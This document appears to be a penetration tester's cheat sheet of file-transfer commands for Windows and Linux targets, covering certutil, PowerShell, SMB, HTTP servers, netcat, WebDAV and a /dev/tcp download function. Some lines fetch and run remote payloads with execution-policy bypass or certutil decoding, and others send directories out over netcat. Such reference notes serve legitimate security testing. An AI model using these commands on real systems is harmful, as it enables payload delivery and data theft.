# share files

## Windows

```bash
certutil.exe -urlcache [-split] -f <source> <destn>
PS> wget <source> -OutFile <dest>
PS> Invoke-WebRequest -Uri <source> -Outfile <dest>
powershell -c (New-Object System.Net.WebClient).downloadFile('<source>', '<dest>')
powershell -exec bypass IEX(New-Object Net.WebClient).downloadString('/shell.ps1')
certutil.exe -urlcache -split -f <source> payload.b64 & certutil.exe -decode payload.b64 payload.exe & payload.exe
bitsadmin /transfer job <source> <dest>
wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309

# SMB Server
impacket-smbserver [-smb2support] drive .

# on windows to copy (download)
copy \\IP\drive\file
# upload 
copy file \\IP\drive\

# mount smb-share-drive on windows using powershell
PS> New-PSDrive -Name "winDrive" -PSProvider "FileSystem" -Root "\\IP\drive"
Navigating to "winDrive" shows us all files

# upload dir (with all in it)
robocopy dir \\IP\drive\ /E
[OR]
net use Z: \\IP\drive /u:<username> <pass>
copy file Z:\
```

## HTTP Server

Alternative: [sc0tfree/updog](https://github.com/sc0tfree/updog)

```bash
python3 -m http.server 80
python2 -m SimpleHttpSever 80
php -S IP:PORT
wget <IP>:<PORT>/<file> -O <file>
curl <IP>:<PORT>/<file> -o <file>
scp file kashz@IP:/PATH/FILE

# download all files
wget -r <IP>:<PORT>/<DIR>/

# using base64
base64 <executable> > out
base64 -d out > <executable>
```

## NC

```bash
# receiver
nc -l -p <PORT> > out.file
# sender
nc -w 3 <IP> <PORT> < in.file

# receiver
nc -l -p 1234 | uncompress -c | tar xvfp -
# sender
tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234
```

## webdav

```bash
# pip install wsgidav cheroot
mkdir /tmp/kashz; wsgidav --host=IP --port=80 --root=/tmp/kashz

# windows
net use * http://IP/
```

## Curl function (linux only)

Use when system does not have `wget, curl.`NOTE: works for binary files too. Fails for `https://` with self signed certificates.

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
# usage
__curl http://IP/FILE > out
```
